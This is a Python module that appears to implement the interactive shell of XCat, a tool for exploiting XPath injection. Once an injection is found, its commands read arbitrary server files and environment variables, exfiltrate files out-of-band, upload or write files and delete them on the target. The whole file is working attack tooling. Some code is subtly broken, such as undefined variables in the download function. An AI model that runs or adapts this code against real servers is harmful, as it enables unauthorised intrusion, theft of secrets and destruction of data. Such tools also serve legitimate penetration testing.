import base64
import pathlib
import shlex
import sys
from collections import namedtuple
from os.path import expanduser

from prompt_toolkit import prompt_async
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.contrib.completers import WordCompleter
from prompt_toolkit.history import FileHistory
from tqdm import tqdm

from xcat.algorithms import (count, get_file_via_entity_injection, get_nodes,
                             get_string, get_string_via_oob, iterate_all,
                             upload_file_via_oob)
from xcat.display import display_xml
from xcat.requester import Requester
from xcat.xpath import E
from xcat.xpath.fs import (append_binary, base_64_binary, delete, read_binary,
                           write_text)
from xcat.xpath.saxon import read_binary_resource
from xcat.xpath.xpath_1 import concat, string, string_length, substring
from xcat.xpath.xpath_2 import (current_date_time, doc, doc_available,
                                document_uri, resolve_uri)
from xcat.xpath.xpath_3 import (available_environment_variables,
                                environment_variable, unparsed_text,
                                unparsed_text_available, unparsed_text_lines)


class CommandFailed(RuntimeError):
    pass


async def throwfailed(coro):
    if not await coro:
        raise CommandFailed()


async def find_file_by_name(requester: Requester, file_name):
    for i in range(10):
        path = ('../' * i) + file_name
        print(path)

        path_expression = resolve_uri(path, document_uri(E('/')))

        if requester.features['doc-function']:
            if await requester.check(doc_available(path_expression)):
                print(f'XML file {path} available')

        if requester.features['unparsed-text']:
            if await requester.check(unparsed_text_available(path_expression)):
                print(f'Text file {path} available')

async def download_file(requester: Requester, remote_path, local_path):
        local_path = pathlib.Path(local_path)
        if local_path.exists():
            print(f'{local_path} already exists! Not overwriting')
            return

        func = read_binary if requester.features['expath-file'] else read_binary_resource
        expression = string(func(remote_path))

        print(f'Downloading {remote} to {local}')

        size = await count(requester, expression, func=string_length)
        print(f'Size: {size}')

        CHUNK_SIZE = 5 * 1024
        result = ""
        for index in tqdm(range(1, size + 1, CHUNK_SIZE)):
            data = await get_string_via_oob(requester, substring(expression, index, CHUNK_SIZE))
            if data is None:
                raise CommandFailed(f'Failed to download chunk {index}. Giving up. Sorry.')
            else:
                result += data
            sys.stdout.flush()
        sys.stdout.write('\n')
        local_path.write_bytes(base64.decodebytes(result.encode()))
        print(f'Downloaded, saved to {local_path}')


async def read_env(requester: Requester):
    all_exp = available_environment_variables()
    total = await count(requester, all_exp)
    env_output = [
        concat(env_name, ' = ', environment_variable(env_name))
        for env_name in all_exp[:total + 1]
        ]
    async for variable in iterate_all(requester, env_output):
        print(variable)


async def cat(requester: Requester, path):
    if requester.features['unparsed-text']:
        if not await requester.check(unparsed_text_available(path)):
            print(f'File {path} doesn\'t seem to be available.')
            if input('Continue anyway? [y/n] ').lower() != 'y':
                return

        if requester.features['oob-http']:
            # Fetch in one go
            expression = unparsed_text(path)
            print(await get_string_via_oob(requester, expression))
        else:
            # Line by line
            expression = unparsed_text_lines(path)
            length = await count(requester, expression)
            print(f"Lines: {length}")
            async for line in iterate_all(requester, expression[:length + 1]):
                print(line)
    elif requester.features['oob-entity-injection']:
        path = f'file://{path}'
        print(f'Fetching {path}')
        print(await get_file_via_entity_injection(requester, path))


async def upload_file(requester: Requester, local_path, remote_path):
    local_path = pathlib.Path(local_path)
    if not local_path.exists():
        print(f'Cannot find {local_path}!')
        return

    print(f'Uploading {local_path} to {remote_path}')
    data = local_path.read_bytes()
    print(f'Length: {len(data)} bytes')

    if requester.features['oob-http']:
        print(await upload_file_via_oob(requester, remote_path, data))
    else:
        chunks = list(split_chunks(data, 1024))
        print(f'Uploading {len(chunks)} chunks')

        await requester.check(delete(remote_path))

        for i, chunk in enumerate(tqdm(chunks), 1):
            chunk = base64.b64encode(chunk).decode()
            for _ in range(5):
                if await count(requester, append_binary(remote_path, base_64_binary(chunk)) == 0):
                    break
                else:
                    continue
            else:
                raise CommandFailed(f'Failed to upload chunk {i} 5 times. Giving up. Sorry.')

        sys.stdout.write('\n')


async def show_help(requester: Requester):
    for command in COMMANDS:
        print(f' * {command.name} - {command.help_display}')
        print(f'   {command.help_text}')


class Command(namedtuple('Command', 'name args help_text function feature_test')):
    @property
    def help_display(self):
        return ' '.join(f'"{arg}"' for arg in self.args)


COMMANDS = [
    Command('get', ['xpath-expression'], 'Fetch a specific node by xpath expression',
            lambda requester, expression: display_xml(get_nodes(requester, E(expression))), None),
    Command('get_string', ['xpath-expression'], 'Fetch a specific string by xpath expression',
            lambda requester, expression: get_string(requester, E(expression)), None),
    Command('pwd', [], 'Get the URI of the current document',
            lambda requester: get_string(requester, document_uri(E('/'))), ['document-uri']),
    Command('time', [], 'Get the current date+time of the server',
            lambda requester: get_string(requester, string(current_date_time())), ['current-datetime']),
    Command('rm', ['path'], 'Delete a file by path', 
            lambda requester, path: throwfailed(count(requester, delete(path))), ['expath-file']),
    Command('write-text', ['location', 'text'], 'Write text to location',
            lambda requester, location, text: throwfailed(requester.check(write_text(location, text))), ['expath-file']),
    Command('cat_xml', ['path'], 'Read an XML file at "location"',
            lambda requester, location: display_xml(get_nodes(requester, doc(location) / '*')), ['doc-function']),
    Command('find-file', ['file-name'], 'Find a file by name in parent directories',
            find_file_by_name, ['unparsed-text', 'doc-function']),
    Command('download', ['remote-path', 'local-path'], 'Download a file from remote-path to local-path',
            download_file, lambda f: (f['expath-file'] or f['saxon']) and f['oob-http']),
    Command('upload', ['local-path', 'remote-path'], 'Upload file from local-path to remote-path',
            upload_file, ['expath-file']),
    Command('env', [], 'Read environment variables', read_env, ['environment-variables']),
    Command('cat', ['path'], 'Read a file (including network resources like ftp/http)', cat, None),
    Command('ls', ['path'], 'Read a directory', cat, None),
    Command('help', [], 'Display help', show_help, None)
]


async def run_shell(requester: Requester):
    if not sys.stdout.isatty():
        print('Stdout is not a tty! Cannot open shell', file=sys.stderr)
        return

    history = FileHistory(expanduser('~/.xcat_history'))

    command_dict = {
        command.name: command
        for command in COMMANDS
    }

    completer = WordCompleter(list(command_dict.keys()),
                              meta_dict={command.name: f'{command.help_display} - {command.help_text}'
                                         for command in COMMANDS},
                              sentence=True)

    print("XCat shell. Enter a command or 'help' for help. Funnily enough.")
    while True:
        cmd = await prompt_async('>> ', patch_stdout=True, completer=completer, history=history,
                                 auto_suggest=AutoSuggestFromHistory())
        command = shlex.split(cmd)
        if not command:
            continue
        elif len(command) == 1:
            name, args = command[0], []
        else:
            name, args = command[0], command[1:]

        if name not in command_dict:
            print(f'Command {name} not found, try "help"')
        else:
            command = command_dict[name]

        features_required = command.feature_test
        if callable(features_required):
            has_required_features = features_required(requester.features)
        elif isinstance(features_required, (tuple, list)):
            has_required_features = any(requester.features[f] for f in features_required)
        elif features_required is None:
            has_required_features = True
        else:
            raise RuntimeError(f'Unhandled features_required: {features_required}')

        if not has_required_features:
            print(f'Cannot use command {command.name}, not all required features are present in this injection')
            continue

        try:
            await command.function(requester, *args)
        except CommandFailed as e:
            print(f'Error! Command appeared to fail: {e}')


def split_chunks(l, n):
    """Yield successive n-sized chunks from l."""
    for i in range(0, len(l), n):
        yield l[i:i + n]
